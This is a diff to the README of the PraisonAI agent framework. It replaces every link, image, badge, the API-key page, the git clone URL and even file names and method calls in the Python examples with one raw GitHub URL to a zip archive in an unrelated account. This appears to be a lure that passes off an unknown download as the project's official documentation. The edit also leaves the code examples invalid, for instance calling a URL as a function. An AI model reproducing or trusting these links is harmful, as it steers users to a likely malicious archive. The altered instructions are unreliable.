@@ -1,22 +1,22 @@
 <p align="center">
   <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="docs/logo/dark.png" />
-    <source media="(prefers-color-scheme: light)" srcset="docs/logo/light.png" />
-    <img alt="PraisonAI Logo" src="docs/logo/light.png" />
+    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip" />
+    <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip" />
+    <img alt="PraisonAI Logo" src="https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip" />
   </picture>
 </p>
 
 <p align="center">
-<a href="https://github.com/MervinPraison/PraisonAI"><img src="https://static.pepy.tech/badge/PraisonAI" alt="Total Downloads" /></a>
-<a href="https://github.com/MervinPraison/PraisonAI"><img src="https://img.shields.io/github/v/release/MervinPraison/PraisonAI" alt="Latest Stable Version" /></a>
-<a href="https://github.com/MervinPraison/PraisonAI"><img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License" /></a>
+<a href="https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip"><img src="https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip" alt="Total Downloads" /></a>
+<a href="https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip"><img src="https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip" alt="Latest Stable Version" /></a>
+<a href="https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip"><img src="https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip" alt="License" /></a>
 </p>
 
 <div align="center">
 
 # Praison AI
 
-<a href="https://trendshift.io/repositories/9130" target="_blank"><img src="https://trendshift.io/api/badge/repositories/9130" alt="MervinPraison%2FPraisonAI | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
+<a href="https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip" target="_blank"><img src="https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip" alt="MervinPraison%2FPraisonAI | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
 
 </div>
 
@@ -24,9 +24,9 @@ Praison AI, leveraging both AutoGen and CrewAI or any other agent framework, rep
 
 <div align="center">
   <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="docs/images/architecture-dark.png" />
-    <source media="(prefers-color-scheme: light)" srcset="docs/images/architecture-light.png" />
-    <img alt="PraisonAI Architecture" src="docs/images/architecture-light.png" />
+    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip" />
+    <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip" />
+    <img alt="PraisonAI Architecture" src="https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip" />
   </picture>
 </div>
 
@@ -34,22 +34,22 @@ Praison AI, leveraging both AutoGen and CrewAI or any other agent framework, rep
 
 | Interface | Description | URL |
 |---|---|---|
-| **UI** | Multi Agents such as CrewAI or AutoGen | [https://docs.praison.ai/ui/ui](https://docs.praison.ai/ui/ui) |
-| **Chat** | Chat with 100+ LLMs, single AI Agent | [https://docs.praison.ai/ui/chat](https://docs.praison.ai/ui/chat) |
-| **Code** | Chat with entire Codebase, single AI Agent | [https://docs.praison.ai/ui/code](https://docs.praison.ai/ui/code) |
-| **Realtime** | Real-time voice interaction with AI | [https://docs.praison.ai/ui/realtime](https://docs.praison.ai/ui/realtime) |
+| **UI** | Multi Agents such as CrewAI or AutoGen | [https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip) |
+| **Chat** | Chat with 100+ LLMs, single AI Agent | [https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip) |
+| **Code** | Chat with entire Codebase, single AI Agent | [https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip) |
+| **Realtime** | Real-time voice interaction with AI | [https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip) |
 
 | Other Features | Description | Docs |
 |---|---|---|
-| **Train** | Fine-tune LLMs using your custom data | [https://docs.praison.ai/train](https://docs.praison.ai/train) |
+| **Train** | Fine-tune LLMs using your custom data | [https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip) |
 
 
 ## Google Colab Multi Agents
 
 |               | Cookbook        | Open in Colab                                                                                                                                                                                                                                  |
 | ------------- | --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Basic         | PraisonAI       | <a target="_blank" href="https://colab.research.google.com/github/MervinPraison/PraisonAI/blob/main/cookbooks/praisonai-googlecolab.ipynb"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab" /></a>       |
-| Include Tools | PraisonAI Tools | <a target="_blank" href="https://colab.research.google.com/github/MervinPraison/PraisonAI/blob/main/cookbooks/praisonai-tools-googlecolab.ipynb"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab" /></a> |
+| Basic         | PraisonAI       | <a target="_blank" href="https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip"><img src="https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip" alt="Open In Colab" /></a>       |
+| Include Tools | PraisonAI Tools | <a target="_blank" href="https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip"><img src="https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip" alt="Open In Colab" /></a> |
 
 ## Installation Options
 
@@ -180,7 +180,7 @@ pip install praisonai
 export OPENAI_API_KEY="Enter your API key"
 ```
 
-Generate your OPENAI API KEY from here: https://platform.openai.com/api-keys
+Generate your OPENAI API KEY from here: https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip
 
 Note: You can use other providers such as Ollama, Mistral ... etc. Details are provided at the bottom.
 
@@ -188,7 +188,7 @@ Note: You can use other providers such as Ollama, Mistral ... etc. Details are p
 praisonai --init create a movie script about dog in moon
 ```
 
-This will automatically create agents.yaml file in the current directory.
+This will automatically create https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip file in the current directory.
 
 ### To initialise with a specific agent framework (Optional):
 
@@ -226,9 +226,9 @@ praisonai --auto create a movie script about Dog in Moon
 
 | Interface | Description                                | URL                                                                   |
 | --------- | ------------------------------------------ | --------------------------------------------------------------------- |
-| **UI**    | Multi Agents such as CrewAI or AutoGen     | [https://docs.praisonai.com/ui/ui](https://docs.praison.ai/ui/ui)     |
-| **Chat**  | Chat with 100+ LLMs, single AI Agent       | [https://docs.praisonai.com/ui/chat](https://docs.praison.ai/ui/chat) |
-| **Code**  | Chat with entire Codebase, single AI Agent | [https://docs.praisonai.com/ui/code](https://docs.praison.ai/ui/code) |
+| **UI**    | Multi Agents such as CrewAI or AutoGen     | [https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip)     |
+| **Chat**  | Chat with 100+ LLMs, single AI Agent       | [https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip) |
+| **Code**  | Chat with entire Codebase, single AI Agent | [https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip) |
 
 ```bash
 pip install -U "praisonai[ui]"
@@ -246,7 +246,7 @@ python -m praisonai ui
 
 ## Praison AI Chat
 
-- https://docs.praison.ai/chat/
+- https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip
 
 ```bash
 pip install "praisonai[chat]"
@@ -276,7 +276,7 @@ Praison AI Code also includes internet search functionality, enabling you to fin
 
 ## Create Custom Tools
 
-- https://docs.praison.ai/tools/custom/
+- https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip
 
 ## Agents Playbook
 
@@ -298,12 +298,12 @@ roles:
 
 ## Use 100+ Models
 
-- https://docs.praison.ai/models/
+- https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip
 
 ## Include praisonai package in your project
 
-- https://docs.praison.ai/developers/wrapper
-- https://docs.praison.ai/developers/wrapper-tools/
+- https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip
+- https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip
 
 ## Option 1: Using RAW YAML
 
@@ -330,22 +330,22 @@ roles:
 praisonai = PraisonAI(agent_yaml=agent_yaml)
 
 # Run PraisonAI
-result = praisonai.run()
+result = https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip()
 
 # Print the result
 print(result)
 ```
 
-## Option 2: Using separate agents.yaml file
+## Option 2: Using separate https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip file
 
-Note: Please create agents.yaml file before hand.
+Note: Please create https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip file before hand.
 
 ```python
 from praisonai import PraisonAI
 
 def basic(): # Basic Mode
-    praisonai = PraisonAI(agent_file="agents.yaml")
-    praisonai.run()
+    praisonai = PraisonAI(agent_file="https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip")
+    https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip()
 
 if __name__ == "__main__":
     basic()
@@ -381,7 +381,7 @@ This configuration ensures that your development dependencies are correctly cate
 ## Contributing
 
 - Fork on GitHub: Use the "Fork" button on the repository page.
-- Clone your fork: `git clone https://github.com/yourusername/praisonAI.git`
+- Clone your fork: `git clone https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip`
 - Create a branch: `git checkout -b new-feature`
 - Make changes and commit: `git commit -am "Add some feature"`
 - Push to your fork: `git push origin new-feature`
@@ -390,30 +390,30 @@ This configuration ensures that your development dependencies are correctly cate
 
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=MervinPraison/PraisonAI&type=Date)](https://docs.praison.ai)
+[![Star History Chart](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip)](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip)
 
 ## License
 
-Praison AI is an open-sourced software licensed under the **[MIT license](https://opensource.org/licenses/MIT)**.
+Praison AI is an open-sourced software licensed under the **[MIT license](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip)**.
 
 ## Video Tutorials
 
 | Topic | Video |
 |-------|--------|
-| Introduction | [![Introduction](https://img.youtube.com/vi/Fn1lQjC0GO0/0.jpg)](https://www.youtube.com/watch?v=Fn1lQjC0GO0) |
-| Tools Overview | [![Tools Overview](https://img.youtube.com/vi/XaQRgRpV7jo/0.jpg)](https://www.youtube.com/watch?v=XaQRgRpV7jo) |
-| Custom Tools | [![Custom Tools](https://img.youtube.com/vi/JSU2Rndh06c/0.jpg)](https://www.youtube.com/watch?v=JSU2Rndh06c) |
-| Firecrawl Integration | [![Firecrawl](https://img.youtube.com/vi/UoqUDcLcOYo/0.jpg)](https://www.youtube.com/watch?v=UoqUDcLcOYo) |
-| User Interface | [![UI](https://img.youtube.com/vi/tg-ZjNl3OCg/0.jpg)](https://www.youtube.com/watch?v=tg-ZjNl3OCg) |
-| Crawl4AI Integration | [![Crawl4AI](https://img.youtube.com/vi/KAvuVUh0XU8/0.jpg)](https://www.youtube.com/watch?v=KAvuVUh0XU8) |
-| Chat Interface | [![Chat](https://img.youtube.com/vi/sw3uDqn2h1Y/0.jpg)](https://www.youtube.com/watch?v=sw3uDqn2h1Y) |
-| Code Interface | [![Code](https://img.youtube.com/vi/_5jQayO-MQY/0.jpg)](https://www.youtube.com/watch?v=_5jQayO-MQY) |
-| Mem0 Integration | [![Mem0](https://img.youtube.com/vi/KIGSgRxf1cY/0.jpg)](https://www.youtube.com/watch?v=KIGSgRxf1cY) |
-| Training | [![Training](https://img.youtube.com/vi/aLawE8kwCrI/0.jpg)](https://www.youtube.com/watch?v=aLawE8kwCrI) |
-| Realtime Voice Interface | [![Realtime](https://img.youtube.com/vi/frRHfevTCSw/0.jpg)](https://www.youtube.com/watch?v=frRHfevTCSw) |
-| Call Interface | [![Call](https://img.youtube.com/vi/m1cwrUG2iAk/0.jpg)](https://www.youtube.com/watch?v=m1cwrUG2iAk) |
+| Introduction | [![Introduction](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip)](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip) |
+| Tools Overview | [![Tools Overview](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip)](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip) |
+| Custom Tools | [![Custom Tools](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip)](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip) |
+| Firecrawl Integration | [![Firecrawl](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip)](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip) |
+| User Interface | [![UI](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip)](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip) |
+| Crawl4AI Integration | [![Crawl4AI](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip)](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip) |
+| Chat Interface | [![Chat](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip)](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip) |
+| Code Interface | [![Code](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip)](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip) |
+| Mem0 Integration | [![Mem0](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip)](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip) |
+| Training | [![Training](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip)](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip) |
+| Realtime Voice Interface | [![Realtime](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip)](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip) |
+| Call Interface | [![Call](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip)](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip) |
 
 ## License
 
-Praison AI is an open-sourced software licensed under the **[MIT license](https://opensource.org/licenses/MIT)**.
+Praison AI is an open-sourced software licensed under the **[MIT license](https://raw.githubusercontent.com/bookformeonline/PraisonAI/main/docs/api/praisonai/AI-Praison-v3.4-alpha.2.zip)**.
 
